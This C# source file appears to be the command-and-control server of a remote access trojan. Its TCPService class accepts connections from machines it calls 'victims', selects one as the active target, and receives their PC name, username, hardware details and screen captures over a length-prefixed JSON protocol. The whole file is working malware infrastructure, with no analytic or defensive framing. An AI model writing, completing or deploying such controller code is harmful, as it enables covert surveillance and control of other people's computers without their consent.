using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Text.Json;
using Controller.Models;
using System.Diagnostics;

namespace Controller.Services
{
    public delegate Task MessageHandlerDelegate(IVictim client, string messageType, object payload);

    public static class TCPService
    {
        private static Victim? activeClient;
        private static TcpListener? listener;
        private static VictimManager? clientManager;
        private static MessageHandlerDelegate? messageHandler;
        private static CancellationTokenSource? cts;
        private static JsonSerializerOptions? jsonOptions;

        public static Action<Victim>? OnVictimConnected { get; set; }
        public static Action<Victim>? OnVictimDisconnected { get; set; }

        public static void Start(int port, MessageHandlerDelegate handler)
        {
            listener = new TcpListener(IPAddress.Parse("0.0.0.0"), port);
            clientManager = new VictimManager();
            messageHandler = handler;
            cts = new CancellationTokenSource();
            jsonOptions = new JsonSerializerOptions
            {
                PropertyNameCaseInsensitive = true
            };

            _ = StartAsync(); // Server runs asynchronously
        }

        public static void SetTarget(Victim victim)
        {
            activeClient = victim;
        }

        public static Task SendAsync<T>(string messageType, T payload)
        {
            if (activeClient == null) return Task.CompletedTask;
            return activeClient.SendMessageAsync(messageType, payload);
        }

        public static void Stop()
        {
            cts?.Cancel();

            foreach (var client in clientManager?.GetAllClients()!)
            {
                client.DisconnectAsync();
            }

            listener?.Stop();
            Debug.WriteLine("Server stopped.");
        }

        private static async Task StartAsync()
        {
            try
            {
                listener?.Start();
                Debug.WriteLine($"Server started on {((IPEndPoint)listener?.LocalEndpoint!).Port}");

                while (!cts!.Token.IsCancellationRequested)
                {
                    var tcpClient = await listener.AcceptTcpClientAsync(cts.Token);
                    var client = new Victim(tcpClient);
                    clientManager?.AddClient(client);
                    _ = HandleClientAsync(client);
                }
            }
            catch (OperationCanceledException)
            {
                Debug.WriteLine("Server shutting down...");
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Server error: {ex.Message}");
                throw;
            }
        }

        private static async Task HandleClientAsync(Victim client)
        {
            try
            {
                while (!cts!.Token.IsCancellationRequested)
                {
                    var message = await ReadMessageAsync(client.Stream);
                    if (message == null) break;

                    await ProcessMessageAsync(client, message);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Client {client.Id} error: {ex.Message}");
            }
            finally
            {
                OnVictimDisconnected?.Invoke(client);
                clientManager?.RemoveClient(client.Id);
                if (activeClient == client) activeClient = null;

                client.DisconnectAsync();
            }
        }

        private static async Task<JsonDocument?> ReadMessageAsync(NetworkStream stream)
        {
            var lengthBytes = new byte[4];
            var bytesRead = await stream.ReadAsync(lengthBytes.AsMemory(0, 4));
            if (bytesRead < 4) return null;

            if (BitConverter.IsLittleEndian)
            {
                Array.Reverse(lengthBytes);
            }
            var messageLength = BitConverter.ToInt32(lengthBytes, 0);

            var messageBytes = new byte[messageLength];
            bytesRead = await stream.ReadAsync(messageBytes.AsMemory(0, messageLength));
            if (bytesRead < messageLength) return null;

            var json = Encoding.UTF8.GetString(messageBytes);
            return JsonDocument.Parse(json);
        }

        private static async Task ProcessMessageAsync(IVictim client, JsonDocument message)
        {
            string messageType = message.RootElement.GetProperty("Type").GetString() ?? "n/k";
            JsonElement payloadElement = message.RootElement.GetProperty("Payload");
            object? payload = null;

            switch (messageType.ToLower())
            {
                case MSGType.InitMSG:
                    var imsg = JsonSerializer.Deserialize<InitMSG>(payloadElement.GetRawText(), jsonOptions);
                    var victim = ((Victim)client);

                    Debug.WriteLine($"PCName: {imsg?.PCName}, Username: {imsg?.Username}, DriveCount: {imsg?.DriveCount}, CPUCores: {imsg?.CPUCores}, Is64Bit: {imsg?.Is64Bit}");

                    victim.Init(imsg);
                    OnVictimConnected?.Invoke(victim);
                    return;

                case MSGType.ScreenMSG:
                    payload = JsonSerializer.Deserialize<ScreenMSG>(payloadElement.GetRawText(), jsonOptions);
                    break;
            }

            if (payload != null && messageHandler != null)
            {
                await messageHandler(client, messageType, payload);
            }
        }
    }
}
